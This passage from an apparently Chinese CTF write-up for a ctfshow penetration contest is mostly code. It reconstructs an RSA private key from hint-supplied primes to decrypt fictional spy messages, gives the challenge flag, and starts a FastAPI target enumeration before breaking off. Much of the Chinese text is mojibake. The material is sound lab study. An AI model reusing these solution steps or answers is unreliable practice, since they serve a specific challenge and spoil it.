string">'''ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA='''</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">printMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> message<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> key<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'inputMessage_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m"</span> <span class="token operator">+</span> <span class="token string">"è¯·ä½¿ç”¨ç»„ç»‡åˆ†é…çš„ç§é’¥è§£å¯†åä½¿ç”¨"</span> <span class="token operator">+</span> <span class="token string">"\033[0m"</span><span class="token punctuation">)</span>        title <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>title<span class="token punctuation">,</span> <span class="token string">'%Y%m%d'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment"># æœ€æ–°æµé€šå…¬é’¥</span><span class="token keyword">def</span> <span class="token function">getPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">b'''    -----BEGIN PUBLIC KEY-----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDRgms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZaQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgumqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq29F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4nidJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELHTnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEAAQ==-----END PUBLIC KEY-----'''</span><span class="token keyword">def</span> <span class="token function">enctryptMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> base64    message_bytes <span class="token operator">=</span> message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>      message_base64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>message_bytes<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    publicKey <span class="token operator">=</span> getPublicKey<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> serialization    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>asymmetric <span class="token keyword">import</span> padding    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> hashes    public_key <span class="token operator">=</span> serialization<span class="token punctuation">.</span>load_pem_public_key<span class="token punctuation">(</span>publicKey<span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    encrypted <span class="token operator">=</span> public_key<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>        message_base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        padding<span class="token punctuation">.</span>OAEP<span class="token punctuation">(</span>            mgf<span class="token operator">=</span>padding<span class="token punctuation">.</span>MGF1<span class="token punctuation">(</span>algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            label<span class="token operator">=</span><span class="token boolean">None</span>        <span class="token punctuation">)</span>    <span class="token punctuation">)</span>    encrypted_base64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> encrypted_base64printMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆæˆ‘ä»¬å°è¯•è°ƒç”¨ä¸€ä¸‹è¿™ä¸ª printMessage</p><p>ç›´æ¥æ‰§è¡Œ<code>from secretMessageResponse import printMessage</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">è¯·ä½¿ç”¨ç»„ç»‡åˆ†é…çš„ç§é’¥è§£å¯†åä½¿ç”¨<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">16</span>gHgAsclUVPhWDv4S8Oa8SuRTDaj<span class="token operator">+</span>V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm<span class="token operator">/</span>yv2<span class="token operator">/</span>e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT<span class="token operator">+</span>mg4RkIIFgx35w4J1KgO72pSP8j1p<span class="token operator">+</span>R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u<span class="token operator">+</span>iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r<span class="token operator">/</span>klPHfxQ<span class="token operator">+</span>psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv<span class="token operator">/</span>IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f<span class="token operator">/</span>uS64Ss0Ixii8nmfsFOjQBCcIYN<span class="token operator">+</span>HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7<span class="token operator">+</span>Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH<span class="token operator">+</span>vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU<span class="token operator">/</span>rv4R58obD<span class="token operator">/</span>o<span class="token operator">+</span>QqI1Mrb4wwpX9tsL7ZbROw<span class="token operator">/</span>MXJwM<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>è¯·ä½¿ç”¨ç»„ç»‡åˆ†é…çš„ç§é’¥è§£å¯†åä½¿ç”¨<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">11</span>Z93Khatj<span class="token operator">+</span>AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX<span class="token operator">/</span>xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh<span class="token operator">/</span>gippMpP<span class="token operator">+</span>8Ik2X<span class="token operator">/</span>QRBx5gdhq0xam<span class="token operator">+</span>wuVC<span class="token operator">+</span><span class="token number">77</span><span class="token operator">/</span>tyu8Fd<span class="token operator">/</span>DohKbAMp8aaJsFr<span class="token operator">/</span>W4mLDZ1gv4JK<span class="token operator">+</span>2O3l<span class="token operator">+</span>bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb<span class="token operator">+</span>SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6<span class="token operator">/</span>LdhqsTNelXl<span class="token operator">/</span>Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG<span class="token operator">+</span>S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB<span class="token operator">/</span>hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX<span class="token operator">/</span>9eBkznEhzeWnJ1yMsYkj<span class="token operator">+</span>ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme<span class="token operator">+</span>T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>è¯·ä½¿ç”¨ç»„ç»‡åˆ†é…çš„ç§é’¥è§£å¯†åä½¿ç”¨<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">05</span>ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA<span class="token operator">/</span>ICJR7WrwWsVinr6y3u9w<span class="token operator">+</span>ubMZ0mqmtnphzQraagk8NkKc1u1<span class="token operator">+</span>qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi<span class="token operator">+</span>1Aunmy6DeOKRkFwysnrSco5QiiC9<span class="token operator">+</span>gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3<span class="token operator">/</span>Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU<span class="token operator">+</span>iiN4offwrQyr4eEu9ecvmyD2w<span class="token operator">/</span>n7pAOsVnqSzroBujVA<span class="token operator">+</span>CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf<span class="token operator">+</span>MnMQPr80uoxT3mz8IX8pyVnyyw1x6F<span class="token operator">+</span>IK1I2G<span class="token operator">+</span>5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6<span class="token operator">/</span>5Sz1noJrsu6k6WN8ZM0MyRIav<span class="token operator">+</span>xuKP1<span class="token operator">+</span>cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA<span class="token operator">/</span>cEjOICWVzUXwbE5wWUBPCLp2C<span class="token operator">/</span>XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk<span class="token operator">/</span>ahaxdGxGa9CrRyr6sf<span class="token operator">+</span>goA<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”¨hint.txtç»™çš„pï¼Œqç”Ÿæˆç§é’¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSAe <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span>q <span class="token operator">=</span> <span class="token number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">)</span>private <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"privatekey.pem"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>private<span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231212646503.png" alt="image-20241231212646503"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">2024-03-05Park:æ€»éƒ¨å·²ç»ä¸ºä½ å®‰æ’æ–°çš„èº«ä»½ï¼Œè¯·åŠ¡å¿…åœ¨3æ—¥å†…æŠµå°ï¼Œä½ çš„æ–°èº«ä»½æ˜¯æ–°ç«¹å¿åŠ¨ç‰©ä¿æŠ¤é˜²ç–«æ‰€ç½‘ç»œå®‰å…¨é¡¾é—®ï¼Œã€ä»»åŠ¡ä¸­å¿ƒã€‘è´¦å·å¯†ç å’Œä½ ä»»èŒå•ä½ç½‘ç«™çš„æ•°æ®åº“ç”¨æˆ·åå¯†ç ä¸€è‡´ï¼Œè¯·å°½å¿«ä¿®æ”¹ å‘é€äººï¼šDylan2024-04-11Park:ã€ä»»åŠ¡ä¸­å¿ƒã€‘ç½‘å€å·²å˜æ›´ä¸º https://task.ctfer.com ï¼Œè¯·æ³¨æ„ä¿®æ”¹æµè§ˆå™¨åœ°å€æ ä¸­çš„é“¾æ¥ å‘é€äººï¼šDylan2024-12-16Park:ä½ çš„è¡ŒåŠ¨å·²ç»æš´éœ²ï¼Œ24å°æ—¶å†…è¿…é€Ÿæ’¤ç¦»ï¼Œé”€æ¯æ‰€æœ‰èµ„æ–™ï¼Œå°†ç°æœ‰èµ„æ–™ç»Ÿä¸€ä¸Šä¼ åˆ°ã€ä»»åŠ¡ä¸­å¿ƒã€‘å‘é€äººï¼šDylan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagï¼š<code>ctfshow&#123;https://task.ctfer.com&#125;</code></p><hr><h2 id="æ½œå…¥æ•Œè¥"><a href="#æ½œå…¥æ•Œè¥" class="headerlink" title="æ½œå…¥æ•Œè¥"></a>æ½œå…¥æ•Œè¥</h2><p>å¯åŠ¨é¶æœºï¼Œdirsearch æ‰«å‡º openapi.jsonï¼Œæ˜¯ä¸ª fastapi æœåŠ¡</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"openapi"</span><span class="token operator">:</span> <span class="token string">"3.1.0"</span><span class="token punctuation">,</span>  <span class="token property">"info"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"FastAPI"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"paths"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"/login"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"post"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Login"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"login_login_post"</span><span class="token punctuation">,</span>        <span class="token property">"requestBody"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"application/x-www-form-urlencoded"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/Body_login_login_post"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/Token"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token 